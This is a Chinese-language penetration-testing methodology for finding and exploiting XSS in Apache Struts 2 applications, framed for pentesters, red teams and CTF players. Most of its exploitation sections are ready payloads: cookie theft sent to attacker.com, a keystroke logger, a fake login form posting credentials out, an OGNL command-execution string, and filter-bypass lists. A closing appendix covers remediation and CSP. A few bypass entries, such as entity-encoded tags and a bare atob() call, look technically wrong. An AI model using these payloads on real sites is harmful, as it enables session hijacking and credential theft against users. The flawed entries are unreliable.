# Apache Struts XSS 攻击方法论

## 第一部分：文档概述

### 1.1 编写目的
本方法论旨在为渗透测试人员提供针对 Apache Struts 2 框架中 XSS（跨站脚本攻击）漏洞的标准化测试与利用流程。Apache Struts 2 作为广泛使用的 Java Web 框架，其 JSP 视图层的输出编码配置不当可导致严重的 XSS 漏洞。本文档指导测试人员系统性地发现、验证和利用 Struts 应用中的 XSS 漏洞。

### 1.2 适用范围
- **目标框架**: Apache Struts 2.x（所有版本）
- **目标端点**: 所有将用户输入反射到 HTML 响应的 Struts Action 和 JSP 视图
- **典型场景**: 表单提交后回显、搜索结果显示、错误消息显示、成功页面反馈
- **适用环境**: Web 应用渗透测试、CTF 挑战、红队演练

### 1.3 读者对象
- 执行渗透测试的安全工程师
- 进行 Struts 应用代码审计的安全分析师
- 负责 Web 应用安全的开发人员
- CTF 竞赛参与者

---

## 第二部分：核心渗透技术专题

### 专题：Apache Struts XSS 攻击

#### 2.1 技术介绍

**漏洞原理**：
Apache Struts 2 使用 OGNL（Object-Graph Navigation Language）表达式和 JSP 模板引擎来渲染视图。当用户输入通过 Action 处理后传递给 JSP 视图，如果输出时未启用 HTML 转义（escapeHtml="false"），攻击者注入的恶意脚本将在受害者浏览器中执行。

**Struts 2 数据流**：
```
用户输入 → HTTP 请求 → Struts params 拦截器 → Action 属性 → 
OGNL 求值（可选）→ JSP 视图 → <s:property> 输出 → 浏览器执行
```

**危险配置**：
```jsp
<!-- 危险：禁用 HTML 转义 -->
<s:property value="userInput" escapeHtml="false"/>

<!-- 安全：启用 HTML 转义（默认） -->
<s:property value="userInput"/>
<s:property value="userInput" escapeHtml="true"/>
```

**Struts 2 XSS 特点**：
1. **双重漏洞链**: OGNL 注入 + XSS 可能同时存在
2. **框架级缺陷**: 某些版本默认转义行为不一致
3. **视图层问题**: 漏洞通常在 JSP 模板中触发

#### 2.2 攻击常见于哪些业务场景

| 业务场景 | Struts 端点 | 风险点描述 |
|----------|-------------|------------|
| 消息提交反馈 | `/sendMessageAction` → `success.jsp` | 提交的消息在成功页面回显，未转义 |
| 搜索功能 | `/searchAction` → `results.jsp` | 搜索关键词在结果页回显 |
| 错误显示 | 任何 Action → `error.jsp` | 错误消息包含用户输入 |
| 表单验证 | 表单提交 → 重新显示表单 | 验证失败后回显用户输入 |
| 评论/反馈 | `/submitComment` → `thankyou.jsp` | 用户评论内容被反射 |
| 文件上传 | `/uploadAction` → `uploadSuccess.jsp` | 文件名或描述被反射 |

**Apache Struts 2 典型 XSS 场景**：
```
POST /sendMessageAction
  message=<script>alert(1)</script>
  
→ SendMessageAction.setMessage()
→ Action 存储到 message 属性
→ success.jsp: <s:property value="message" escapeHtml="false"/>
→ 浏览器执行恶意脚本
```

#### 2.3 漏洞探测方法

##### 2.3.1 黑盒测试

**输入点识别**：
1. 识别所有表单输入字段（textarea、input、select）
2. 识别 URL 查询参数
3. 识别 HTTP 头部值（User-Agent、Referer 等）
4. 识别 Cookie 值

**初步探测 Payload**：
```html
<!-- 基础 XSS 测试 -->
<script>alert(1)</script>
<script>alert(document.domain)</script>

<!-- 标签绕过测试 -->
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>

<!-- 事件处理器测试 -->
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
```

**结果验证**：
- 观察页面是否弹出 alert 对话框
- 查看页面源代码确认 Payload 是否被转义
- 检查浏览器控制台是否有 JavaScript 错误

**探测步骤**：
```bash
# 步骤 1: 发送测试 Payload
curl -X POST http://target/sendMessageAction \
  -d 'message=<script>alert(1)</script>' \
  -v

# 步骤 2: 检查响应
# 如果响应中包含未转义的 <script> 标签，则存在漏洞
```

##### 2.3.2 白盒测试

**代码审计关键词**：
```jsp
<!-- 搜索以下危险模式 -->
<s:property value=".*" escapeHtml="false"
<s:property value=".*" escape="false"
${param.*}  <!-- JSP EL 直接输出 -->
<%=request.getParameter(".*")%>  <!-- 脚本直接输出 -->
```

**Java 代码检查**：
```java
// 检查 Action 中是否有 sanitization
public void setMessage(String message) {
    // 危险：直接存储，无过滤
    this.message = message;
    
    // 危险：OGNL 求值后存储
    this.message = TextParseUtil.translateVariables(message, valueStack);
}
```

**配置文件检查**：
```xml
<!-- struts.xml 检查拦截器配置 -->
<interceptor-ref name="params">
    <!-- 检查是否有输入过滤 -->
</interceptor-ref>
```

#### 2.4 漏洞利用方法

##### 2.4.1 基础 XSS 利用

**Script 标签注入**：
```html
<script>alert('XSS')</script>
<script>alert(document.domain)</script>
<script>alert(document.cookie)</script>
```

**Img 标签事件注入**：
```html
<img src=x onerror=alert(1)>
<img src="invalid" onerror="alert(document.domain)">
<svg/onload=alert('XSS')>
```

**Body 标签注入**：
```html
<body onload=alert('XSS')>
<body onpageshow=alert(1)>
```

##### 2.4.2 会话劫持

**Cookie 窃取 Payload**：
```html
<script>
    new Image().src = 'http://attacker.com/steal?c=' + document.cookie;
</script>

<script>
    fetch('http://attacker.com/steal', {
        method: 'POST',
        body: document.cookie
    });
</script>
```

**完整会话劫持流程**：
1. 构造恶意页面包含 XSS Payload
2. 受害者访问恶意页面
3. JavaScript 提取 JSESSIONID
4. Cookie 发送到攻击者服务器
5. 攻击者使用窃取的 Cookie 劫持会话

##### 2.4.3 钓鱼攻击

**伪造登录表单**：
```html
<script>
    document.body.innerHTML = `
        <div style="text-align:center;margin-top:50px;">
            <h2>会话已过期，请重新登录</h2>
            <form action="http://attacker.com/steal" method="POST">
                <input type="text" name="username" placeholder="用户名" required><br>
                <input type="password" name="password" placeholder="密码" required><br>
                <input type="submit" value="登录">
            </form>
        </div>
    `;
</script>
```

**键盘记录**：
```html
<script>
    document.addEventListener('keypress', function(e) {
        new Image().src = 'http://attacker.com/keylog?key=' + 
            encodeURIComponent(String.fromCharCode(e.keyCode));
    });
</script>
```

##### 2.4.4 组合攻击（XSS + OGNL）

在 Apache Struts 2 中，XSS 和 OGNL 注入可能同时存在：

```
用户输入： %{@java.lang.Runtime@getRuntime().exec('cmd')}

1. OGNL 求值阶段：执行命令
2. XSS 输出阶段：如果结果包含 HTML，可能触发 XSS
```

#### 2.5 漏洞利用绕过方法

##### 2.5.1 绕过标签过滤

**使用非常规标签**：
```html
<!-- 如果<script>被过滤 -->
<image src=x onerror=alert(1)>
<svg/onload=alert(1)>
<body/onload=alert(1)>
<input onfocus=alert(1) autofocus>
<marquee onstart=alert(1)>
<video><source onerror=alert(1)>
<audio src=x onerror=alert(1)>
```

**使用 CSS 注入**：
```html
<style>
    body { background-image: url("javascript:alert(1)"); }
</style>

<div style="background-image:url(javascript:alert(1))">
```

##### 2.5.2 绕过关键词过滤

**编码绕过**：
```html
<!-- URL 编码 -->
%3Cscript%3Ealert(1)%3C/script%3E

<!-- HTML 实体编码 -->
&lt;script&gt;alert(1)&lt;/script&gt;

<!-- Unicode 编码 -->
\u003cscript\u003ealert(1)\u003c/script\u003e

<!-- Base64 编码 -->
<script>atob('YWxlcnQoMSk=')</script>
```

**字符串拼接**：
```html
<script>
    var a = 'al' + 'ert';
    window[a](1);
</script>

<script>
    ['alert'][0](1)
</script>
```

##### 2.5.3 绕过引号过滤

**使用反引号（ES6）**：
```html
<script>
    alert`1`
</script>

<script>
    document.location = `javascript:alert(1)`
</script>
```

**使用无引号语法**：
```html
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
```

##### 2.5.4 绕过空格过滤

**使用 Tab 或换行**：
```html
<img src=x onerror	=	alert(1)>
<img src=x onerror
=
alert(1)>
```

**使用斜杠**：
```html
<img/src=x/onerror=alert(1)>
<svg/onload=alert(1)>
```

##### 2.5.5 Struts 2 特定绕过

**OGNL 表达式注入**：
如果输入经过 OGNL 求值，可以使用：
```
${'<script>alert(1)</script>'}
%{'<script>alert(1)</script>'}
```

**ValueStack 访问**：
```
<s:property value="%{message}" escapeHtml="false"/>
```

---

## 第三部分：附录

### 3.1 常用 XSS Payload 速查表

| 类别 | Payload | 说明 |
|------|---------|------|
| **探测** | `<script>alert(1)</script>` | 基础 Script 标签 |
| **探测** | `<img src=x onerror=alert(1)>` | Img 事件注入 |
| **探测** | `<svg/onload=alert(1)>` | SVG 注入 |
| **探测** | `<body onload=alert(1)>` | Body 事件注入 |
| **探测** | `<input onfocus=alert(1) autofocus>` | 自动聚焦注入 |
| **Cookie 窃取** | `<script>fetch('http://a.com/?c='+document.cookie)</script>` | Cookie 外带 |
| **钓鱼** | `document.body.innerHTML='<form>...'` | 页面替换 |
| **键盘记录** | `document.addEventListener('keypress',...)` | 按键记录 |
| **绕过** | `<image src=x onerror=alert(1)>` | 绕过 script 过滤 |
| **绕过** | `%3Cscript%3Ealert(1)%3C/script%3E` | URL 编码绕过 |

### 3.2 Struts 2 安全配置

**推荐的安全配置**：
```xml
<!-- struts.xml -->
<constant name="struts.devMode" value="false"/>
<constant name="struts.configuration.xml.reload" value="false"/>
```

**JSP 安全输出**：
```jsp
<!-- 安全：默认 HTML 转义 -->
<s:property value="message"/>

<!-- 安全：显式启用转义 -->
<s:property value="message" escapeHtml="true"/>

<!-- 危险：禁用转义（仅信任内容） -->
<s:property value="trustedContent" escapeHtml="false"/>
```

### 3.3 检测工具

**自动化扫描工具**：
- **Burp Suite**: XSS Scanner 插件
- **OWASP ZAP**: 主动扫描 XSS 规则
- **XSStrike**: 高级 XSS 检测工具
- **Dalfox**: 快速 XSS 扫描器

**手动测试命令**：
```bash
# 使用 curl 测试
curl -X POST http://target/sendMessageAction \
  -d 'message=<img src=x onerror=alert(1)>' \
  | grep -o '<img src=x onerror=alert(1)>'

# 使用 XSStrike
python xsstrike.py -u "http://target/sendMessageAction" \
  --post-data "message=test"
```

### 3.4 修复建议

**应用层面**：
1. 始终启用 `escapeHtml="true"`（或移除该属性使用默认值）
2. 对用户输入进行适当的编码和过滤
3. 实施 Content-Security-Policy (CSP) 头

**框架层面**：
1. 升级到最新版本的 Apache Struts 2
2. 配置全局输出编码策略
3. 使用 Struts 内置的 XSS 防护拦截器

**响应头配置**：
```
Content-Security-Policy: default-src 'self'
X-XSS-Protection: 1; mode=block
X-Content-Type-Options: nosniff
```

---

**文档版本**: 1.0
**最后更新**: 2026 年 3 月
**参考来源**: Apache Struts 2 安全指南、OWASP XSS 防护指南、渗透测试实战案例
